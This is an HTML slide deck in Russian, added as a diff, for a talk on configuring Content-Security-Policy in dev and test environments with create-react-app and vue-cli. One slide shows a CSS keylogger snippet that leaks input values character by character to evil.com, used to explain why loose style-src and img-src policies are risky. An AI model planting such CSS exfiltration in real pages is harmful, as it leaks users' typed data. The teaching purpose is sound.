@@ -1,0 +1,626 @@
+
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <title>Content-Security-Policy в dev и test окружениях.</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <link rel="stylesheet" href="https://shwr.me/shower/themes/ribbon/styles/styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/styles/default.min.css">
+
+    <style>
+        .shower {
+            --slide-ratio: calc(16 / 10);
+        }
+
+        mark > mark.important {
+            z-index: 2;
+        }
+
+        .slide-debug-name {
+            position: absolute;
+            top: 0;
+            left: 0;
+            font-size: 8px;
+            z-index: 100500;
+            background: #ddd;
+            line-height: 8px;
+        }
+
+        .success-img {
+            display: block;
+            position: absolute;
+            bottom: 5%;
+            right: 0;
+            z-index: 10;
+            width: 20%;
+            height: 36%;
+            background: url('http://ed.titov.im/minskjs-feb-2020/pictures/success.png');
+            background-size: cover;
+        }
+
+        .danger-img {
+            display: block;
+            position: absolute;
+            bottom: 5%;
+            right: 1%;
+            z-index: 10;
+            width: 22%;
+            height: 31%;
+            background: url('http://ed.titov.im/minskjs-feb-2020/pictures/danger.jpeg');
+            background-size: cover;
+        }
+    </style>
+</head>
+<body class="shower list">
+
+<header class="caption">
+    <h1>CSP в dev среде.
+        <small style="font-size: 60%;">боль и необходимость.</small>
+    </h1>
+</header>
+
+<!-- SLIDES START -->
+
+
+<!-- START SLIDE main -->
+<section class="slide s-main">
+
+
+    <div>
+        <h2 style="margin-top: 5rem;">
+            Content-Security-Policy в dev и test окружениях
+        </h2>
+
+        <p class="s-main-author"><b>Эдуард Титов</b> <a href="http://ed.titov.im">ed.titov.im</a></p>
+
+        <div class="s-main-info">
+            <p class="note">боль и необходимость</p>
+        </div>
+    </div>
+</section>
+
+<style>
+    .s-main-author {
+        position: absolute;
+        left: 0;
+        bottom: 0;
+        padding: 75px var(--slide-side) 0;
+    }
+
+    .s-main-info {
+        position: absolute;
+        right: 0;
+        bottom: 20%;
+        padding: 75px var(--slide-side) 0;
+        text-align: right;
+        font-size: 80%;
+    }
+</style>
+
+<!-- END SLIDE main -->
+
+<!-- START SLIDE about -->
+<section class="slide">
+
+
+    <div class="columns two">
+        <div>
+            <img src="http://ed.titov.im/minskjs-feb-2020/pictures/me.jpg" alt="" style="width: 100%;height:auto">
+        </div>
+        <div>
+            <h2>О себе</h2>
+            <ul>
+                <li class="next">2012 начал</li>
+                <li class="next">Работал с BackboneJS и Grunt</li>
+                <li class="next">Делал бэкенд на Python</li>
+                <li class="next">React/Vue</li>
+                <li class="next">Знаю, как ощущается -50&deg;C</li>
+                <li class="next" style="line-height: normal;">2018
+                    <small>
+                        <b>Немного про Front-end собеседования в некоторые известные компании</b>
+                        <a href="https://medium.com/@editied/%D0%BD%D0%B5%D0%BC%D0%BD%D0%BE%D0%B3%D0%BE-%D0%BF%D1%80%D0%BE-front-end-%D1%81%D0%BE%D0%B1%D0%B5%D1%81%D0%B5%D0%B4%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8F-%D0%B2-%D0%BD%D0%B5%D0%BA%D0%BE%D1%82%D0%BE%D1%80%D1%8B%D0%B5-%D0%B8%D0%B7%D0%B2%D0%B5%D1%81%D1%82%D0%BD%D1%8B%D0%B5-%D0%BA%D0%BE%D0%BC%D0%BF%D0%B0%D0%BD%D0%B8%D0%B8-cc3ba0228318">medium.com/@editied/...</a>
+                    </small>
+                </li>
+                <li class="next"><span>2018</span> Rebilly</li>
+                <li class="next"><span>2020</span> Lyte</li>
+            </ul>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE about -->
+
+<!-- START SLIDE 1 -->
+<section class="slide">
+
+
+    <div class="">
+        <div>
+            <h1>Content-Security-Policy</h1>
+            <div class="next">С помощью HTTP-заголовка определяет
+                <mark>белый список</mark>
+                ресурсов для текущей страницы
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 1 -->
+
+<!-- START SLIDE 1-2 -->
+<section class="slide">
+
+
+    <div class="">
+        <div>
+            <h1>Content-Security-Policy</h1>
+            <div>
+                <pre><code class="hljs text">Content-Security-Policy: directive:value; directive:value</code></pre>
+            </div>
+
+            <div class="next">
+                <pre><code class="hljs">&lt;meta
+    http-equiv="Content-Security-Policy"
+    content="default-src https:"&gt;</code></pre>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 1-2 -->
+
+<!-- START SLIDE 2 -->
+<section class="slide">
+
+
+    <div class="">
+        <div>
+            <h1>Что будет при ошибке</h1>
+            <p class="next">
+                <img src="https://developers.google.com/web/fundamentals/security/csp/images/csp-error.png" alt="">
+            </p>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 2 -->
+
+<!-- START SLIDE 3 -->
+<section class="slide">
+
+
+    <div class="">
+        <div>
+            <h1>Основные директивы</h1>
+            <ul>
+                <li class="next">
+                    <pre><code class="no-hljs">default-src: <span class="next">none</span></code></pre>
+                </li>
+                <li class="next">
+                    <pre><code class="no-hljs">script-src: <span class="next">self</span></code></pre>
+                </li>
+                <li class="next">
+                    <pre><code class="no-hljs">style-src: <span class="next">self</span></code></pre>
+                </li>
+                <li class="next">
+                    <pre><code class="no-hljs">img-src: <span class="next">self</span></code></pre>
+                </li>
+            </ul>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 3 -->
+
+<!-- START SLIDE 3-1 -->
+<section class="slide">
+
+
+    <div class="">
+        <div>
+            <h1>Основные директивы
+                <small>style-src + img-src</small>
+            </h1>
+            <div class="next">
+                <pre><code class="hljs">default-src: *; style-src: unsafe-inline; img-src: *</code></pre>
+            </div>
+            <div class="next">
+                <pre><code class="hljs css">input[value^=a] {
+    background-image: url("https://evil.com?a");
+}
+input[value^=ab] {
+    background-image: url("https://evil.com?ab");
+}</code></pre>
+            </div>
+        </div>
+        <img src="http://ed.titov.im/minskjs-feb-2020/pictures/no.png" alt="" class="cover next">
+    </div>
+</section>
+
+<!-- END SLIDE 3-1 -->
+
+<!-- START SLIDE 3-1-1 -->
+<section class="slide">
+
+
+    <div class="">
+        <div>
+            <h1>Основные директивы
+                <small>style-src + img-src</small>
+            </h1>
+            <div>
+                <pre><code class="hljs">default-src: <mark>none</mark>; style-src: <mark>self</mark>; img-src: <mark>self</mark></code></pre>
+            </div>
+        </div>
+        <img class="next success-img" src="http://ed.titov.im/minskjs-feb-2020/pictures/success.png" alt="">
+    </div>
+</section>
+
+<!-- END SLIDE 3-1-1 -->
+
+<!-- START SLIDE 3-2 -->
+<section class="slide">
+
+
+    <div class="">
+        <div>
+            <h1>Основные директивы</h1>
+            <ul>
+                <li>
+                    <pre><code class="no-hljs">font-src: <span class="next">'self' https://fonts.gstatic.com;</span></code></pre>
+                </li>
+                <li class="next">
+                    <h4>2018 <a href="https://habr.com/ru/post/348210/">Создаем CSS кейлоггер</a> <code>https://habr.com/ru/post/348210/</code></h4>
+                </li>
+            </ul>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 3-2 -->
+
+<!-- START SLIDE 4 -->
+<section class="slide">
+
+
+    <div class="">
+        <div>
+            <h1>Основные директивы</h1>
+            <ul>
+                <li>
+                    <pre><code class="no-hljs">connect-src: <span class="next">self https://api.example.com</span></code></pre>
+                </li>
+            </ul>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 4 -->
+
+<!-- START SLIDE 5 -->
+<section class="slide">
+
+
+    <div class="">
+        <div>
+            <h1>Реальный пример</h1>
+            <blockquote>
+                content-security-policy: default-src 'none';
+                <span class="next">base-uri 'none'; object-src 'none'; font-src 'none'; media-src 'none';</span>
+                <span class="next">connect-src https://api.example.com https://api-sandbox.example.com;</span>
+                <span class="next">frame-src 'none'; child-src 'none'; form-action 'none'; worker-src 'none';</span>
+                <span class="next">script-src 'self'; img-src 'none';</span>
+                <span class="next">block-all-mixed-content;</span>
+            </blockquote>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 5 -->
+
+<!-- START SLIDE 6 -->
+<section class="slide">
+
+
+    <div class="">
+        <div>
+            <h1>dev & test окружение</h1>
+            <p class="next">
+                <img src="https://bitbar.com/wp-content/uploads/old_testdroid/2016/07/impact-of-downtime.png" alt="">
+            </p>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 6 -->
+
+<!-- START SLIDE 7 -->
+<section class="slide">
+
+
+    <div class="">
+        <div>
+            <img class="cover" src="https://developers.google.com/web/fundamentals/security/csp/images/csp-error.png" alt="">
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 7 -->
+
+<!-- START SLIDE 8 -->
+<section class="slide">
+
+
+    <div class="">
+        <div>
+            <h1>Что ломало наш проект</h1>
+            <ul>
+                <li class="next">
+                    <pre><code class="no-hljs">style-src: self <span class="next">-> self unsafe-inline</span></code></pre>
+                </li>
+                <li class="next">
+                    <pre><code class="no-hljs">connect-src: <span class="next">https://test-api-url.com</span></code></pre>
+                </li>
+            </ul>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 8 -->
+
+<!-- START SLIDE 9 -->
+<section class="slide">
+
+
+    <div class="">
+        <div>
+            <img class="cover" src="https://sun9-9.userapi.com/c499/g22001724/a_25634866.jpg?ava=1" alt="">
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 9 -->
+
+<!-- START SLIDE 10 -->
+<section class="slide">
+
+
+    <div class="">
+        <h1>В чем отличие?</h1>
+        <div>
+            <ul>
+                <li class="next"><b>PROD</b><pre><code>script-src: self</code></pre></li>
+                <li class="next"><b>STAGE</b><pre><code>script-src: self</code></pre></li>
+                <li class="next"><b>DEV</b><pre><code>script-src: self unsafe-inline</code></pre></li>
+            </ul>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 10 -->
+
+<!-- START SLIDE 11 -->
+<section class="slide">
+
+
+    <div class="">
+        <h1>В чем отличие?</h1>
+        <div>
+            <ul>
+                <li><b>PROD</b><pre><code>connect-src https://api.com;</code></pre></li>
+                <li class="next"><b>STAGE</b><pre><code>connect-src https://api.stage.com;</code></pre></li>
+                <li class="next"><b>DEV</b><pre><code>connect-src https://api.dev.com;</code></pre></li>
+            </ul>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 11 -->
+
+<!-- START SLIDE 12 -->
+<section class="slide">
+
+
+    <div class="">
+        <div>
+            <img class="cover" src="https://leonardo.osnova.io/d7d6bc92-fb12-ba0e-13b4-22bee8280d50/-/resize/900/" alt="">
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 12 -->
+
+<!-- START SLIDE 13 -->
+<section class="slide">
+
+
+    <div class="">
+        <h1>create-react-app</h1>
+        <div class="next">
+            <pre><code>// .env
+INLINE_RUNTIME_CHUNK=false
+REACT_APP_HEADER_CSP="default-src 'none';.."
+</code>
+            </pre>
+        </div>
+        <div class="next">
+            <pre><code>// public/index.html
+&lt;meta
+    http-equiv="Content-Security-Policy"
+    content="%REACT_APP_HEADER_CSP%"&gt;
+</code>
+            </pre>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 13 -->
+
+<!-- START SLIDE 14 -->
+<section class="slide">
+
+
+    <div class="">
+        <h1>vue-cli</h1>
+        <div class="next">
+<pre><code style="line-height: 1.5;">// vue.config.js
+module.exports = {
+    chainWebpack: config => {
+        // отключаем eval sourcemap
+        <mark>config.devtool('cheap-module-source-map');</mark>
+
+    }
+};
+</code></pre>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 14 -->
+
+<!-- START SLIDE 14-1 -->
+<section class="slide">
+
+
+    <div class="">
+        <h1>vue-cli</h1>
+        <div>
+<pre><code style="line-height: 1.5;">// vue.config.js
+module.exports = {
+    chainWebpack: config => {
+        // отключаем eval sourcemap
+        config.devtool('cheap-module-source-map');
+        config.devServer.headers({'
+            <mark>Content-Security-Policy': 'default-src 'none';..'</mark>
+        });
+    }
+};
+</code></pre>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 14-1 -->
+
+<!-- START SLIDE 15 -->
+<section class="slide">
+
+
+    <div class="">
+        <h1>vue-cli</h1>
+        <div>
+<pre><code style="line-height: 1.5;" class="javascript">// vue.config.js
+module.exports = {
+    chainWebpack: config => {
+        <mark>config.devServer.before((app) => {</mark>
+
+        });
+    }
+}
+</code></pre>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 15 -->
+
+<!-- START SLIDE 15-1 -->
+<section class="slide">
+
+
+    <div class="">
+        <h1>vue-cli</h1>
+        <div>
+<pre><code style="line-height: 1.5;" class="javascript">// vue.config.js
+module.exports = {
+    chainWebpack: config => {
+        config.devServer.before((app) => {
+            app.use((req, res, next) => {
+                <mark>// calc headers here</mark>
+            });
+        });
+    }
+}
+</code></pre>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 15-1 -->
+
+<!-- START SLIDE 16 -->
+<section class="slide">
+
+
+    <div class="">
+        <div>
+            <img class="cover" src="https://media.makeameme.org/created/its-so-simple-pjuxqr.jpg" alt="">
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 16 -->
+
+<!-- START SLIDE 888 -->
+<section class="slide">
+
+
+    <div class="">
+        <div>
+            <h1>Вишенка на торте</h1>
+            <p class="next">
+                <img style="width:100%;height:auto;" src="../pictures/gram.png" alt="">
+            </p>
+        </div>
+    </div>
+</section>
+
+<!-- END SLIDE 888 -->
+
+<!-- START SLIDE 999 -->
+<section class="slide s-999">
+
+
+    <h2>Вопросы?</h2>
+    <p class="s-999-q">Спасибо за внимание! <br><a href="http://ed.titov.im../"><small>ed.titov.im/minskjs-may-2020</small></a></p>
+    <p class="s-999-end"><b>Эдуард Титов</b> <a href="http://ed.titov.im">ed.titov.im</a></p>
+
+</section>
+
+<style>
+    .s-999 .s-999-end {
+        position: absolute;
+        right: 0;
+        text-align: right;
+        bottom: 0;
+        padding: 75px var(--slide-side) 0;
+    }
+</style>
+
+<!-- END SLIDE 999 -->
+
+
+
+<!-- SLIDES END -->
+
+
+<div class="progress"></div>
+
+<script src="https://shwr.me/shower/shower.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/highlight.min.js"></script>
+
+<script>
+    document.addEventListener('DOMContentLoaded', (event) => {
+        document.querySelectorAll('pre code').forEach((block) => {
+            if(!block.classList.contains('no-hljs')){
+                hljs.highlightBlock(block);
+            }
+        });
+    });
+</script>
+
+</body>
+</html>
+
